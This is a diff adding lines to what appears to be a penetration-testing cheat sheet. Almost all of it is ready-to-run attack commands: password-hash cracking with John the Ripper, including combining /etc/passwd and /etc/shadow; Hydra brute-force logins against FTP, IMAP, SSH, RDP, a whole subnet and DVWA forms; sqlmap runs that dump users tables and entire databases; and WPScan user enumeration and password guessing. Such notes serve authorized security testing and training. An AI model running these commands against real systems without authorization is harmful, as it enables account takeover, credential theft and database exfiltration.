@@ -204,6 +204,31 @@ meterpreter > lsa_dump_secrets
 $ john --format=sha256 hashes_to_crack.txt
 
 $ john --wordlist=<wordlist_file> --rules <hash_file>
+ $ /usr/sbin/john --wordlist=passwd.lst --rules passwd.txt
+
+
+ $ /usr/sbin/john password.txt 
+ # unshadow /etc/passwd /etc/shadow > mypasswd.txt 
+$ /usr/sbin/john --show mypasswd.txt
+
+ hydra -l user -P passlist.txt ftp://192.168.0.1
+ hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+ hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+ hydra -l admin -p password ftp://[192.168.0.0/24]/
+ hydra -L logins.txt -P pws.txt -M targets.txt ssh
+
+hydra -t 4 -V -f -l administrator -P rockyou.txt rdp://192.168.34.16
+
+hydra -t 5 -V -f -L userlist -P passwordlist ftp://192.168.34.16
+
+ssh -L 5901:localhost:5901 user@<ServerIP>
+
+hydra -l admin -P passwordlist ssh://192.168.100.155 -V
+
+hydra 192.168.100.155 -V -l admin -P passwordlist http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low"
+
+hydra.exe 192.168.254.132 -l admin -P C:\cirt\wordslist-sample\wordslist.txt http-get-form “/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=b4o3p65d7fr6jkfcafa0v9qhm2; security=low"
+
 ==============
 Basic scan
 ---------------------
@@ -371,3 +396,35 @@ then prints out anything sent by the listening service within five seconds.
 nmap -sV --script=banner 192.1.0.5
 
 ---------------------------
+python sqlmap.py -u 'http://mytestsite.com/page.php?id=5'
+
+$ python sqlmap.py -u "http://mytestsite.com/page.php?id=5" --random-agent
+
+$ python sqlmap.py -u "http://www.sitemap.com/section.php?id=51" --dbs
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch
+$ python sqlmap.py -u 'http://mytestsite.com/page.php?id=5' --tables
+
+$ python sqlmap.py -u "http://www.site.com/section.php?id=51" --tables -D safecosmetics
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+$ python sqlmap.py -u "http://www.site.com/section.php?id=51" --dump -D safecosmetics -T users
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch
+
+$ python sqlmap.py -u "http://www.site.com/section.php?id=51" --columns -D safecosmetics -T users
+
+===========================
+
+:~/nikto-master/program$ perl nikto.pl -host https://nikto-test.com
+
+~$ wpscan --update
+
+$ wpscan --url http://www.redacted.com --rua
+$ wpscan --url http://www.redacted.com --rua --enumerate vp -o output-plugins.txt
+$ wpscan --url http://www.redacted.com --rua --enumerate U /path/to/user-dictionary.txt
+~$ wpscan --url http://www.redacted.com --rua -P /usr/share/wordlists/rockyou.txt -U ‘Shani’,’InterSkill’
+
+================
+tcpdump -i eth0
